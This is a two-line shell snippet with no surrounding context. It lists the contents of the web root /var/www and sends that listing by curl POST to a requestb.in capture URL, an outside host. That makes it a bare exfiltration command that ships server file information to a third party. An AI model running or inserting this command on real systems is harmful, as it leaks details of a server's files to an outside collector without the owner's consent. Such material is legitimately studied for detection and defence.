temp=`ls /var/www`

curl -X POST -d "fizz=$temp" https://requestb.in/16g4bcs1
